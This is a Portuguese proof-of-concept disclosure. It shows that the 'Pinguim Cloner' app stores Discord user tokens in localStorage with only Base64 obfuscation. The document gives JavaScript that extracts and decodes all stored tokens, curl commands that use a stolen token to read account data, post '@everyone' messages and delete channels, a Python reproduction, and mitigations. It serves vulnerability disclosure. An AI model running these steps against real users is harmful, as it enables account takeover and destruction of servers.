# 🧪 PoC - Roubo de Token Discord no Pinguim Cloner

## A Vulnerabilidade

O app "Pinguim Cloner" armazena tokens de usuário Discord no `localStorage` com uma **ofuscação frágil**:

```javascript
// "Criptografia" (no bundle page-bundle.js)
const encryptToken = token => btoa(token + ":::PINGUIM_CLONER:::")
const decryptToken = encrypted => atob(encrypted).replace(":::PINGUIM_CLONER:::", "")
```

Isso **NÃO é criptografia** — é apenas Base64 com um sufixo constante.

## Prova de Conceito

### 1. Vítima usa o app e salva o token

O app armazena em `localStorage.setItem("pinguim_cloner_accounts")`:

```json
[{
  "id": "123456789012345678",
  "username": "vitima_discord",
  "global_name": "Vítima Silva",
  "avatar": "abc123def456",
  "encryptedToken": "TVRJek5EVTJOemc1TURFeU16UTFOamM0...",
  "lastAccess": "12/06/2026 23:15:00"
}]
```

O `securityInline.js` bloqueia F12 e clique direito — a vítima ACHA que está segura.

### 2. Atacante extrai o token (qualquer script no domínio)

```javascript
// 1 linha para roubar TODOS os tokens
const accounts = JSON.parse(localStorage.getItem('pinguim_cloner_accounts'));

for (const acct of accounts) {
  const token = atob(acct.encryptedToken).replace(":::PINGUIM_CLONER:::", "");
  console.log(`Token de ${acct.username}: ${token}`);
}
```

### 3. Token recuperado

```
Token original: MTIzNDU2Nzg5MDEyMzQ1Njc4OQ.XYZabc_DEF123.ABCDEF...
Token "criptografado": TVRJek5EVTJOemc1TURFeU16UTFOamM0T1EuWFlaYWJjX0RFRjEyMy5BQkNE...
Token recuperado: MTIzNDU2Nzg5MDEyMzQ1Njc4OQ.XYZabc_DEF123.ABCDEF...
```

### 4. Ações possíveis com o token

```bash
# Informações da conta
curl -H "Authorization: {TOKEN}" https://discord.com/api/v9/users/@me

# Listar servidores
curl -H "Authorization: {TOKEN}" https://discord.com/api/v9/users/@me/guilds

# Enviar mensagem
curl -X POST -H "Authorization: {TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"content": "@everyone ACESSO COMPROMETIDO"}' \
  https://discord.com/api/v9/channels/{channel_id}/messages

# Deletar canais (se tiver permissão)
curl -X DELETE -H "Authorization: {TOKEN}" \
  https://discord.com/api/v9/channels/{channel_id}
```

## Reprodução

```python
import base64, json

# Simula extração do localStorage
accounts_json = '[{"encryptedToken":"TVRJek5EVTJOemc1TURFeU16UTFOamM0T1EuWFlaYWJjX0RFRjEyMy5BQkNERUYxMjM0NTY3ODkwYWJjZGVmMTIzNDU2Nzg5MA=="}]'
accounts = json.loads(accounts_json)

for acct in accounts:
    encrypted = acct['encryptedToken']
    decrypted = base64.b64decode(encrypted).decode('utf-8')
    token = decrypted.replace(":::PINGUIM_CLONER:::", "")
    print(f"Token: {token}")
```

## Mitigação

1. **NUNCA** armazenar tokens no navegador — usar httpOnly cookies + backend
2. Usar **bot tokens** oficiais do Discord em vez de user tokens
3. Se precisar armazenar localmente, usar **WebCrypto API** com PW derivado
4. Implementar **Content-Security-Policy** para prevenir XSS
5. Remover `securityInline.js` — dá falsa sensação de segurança
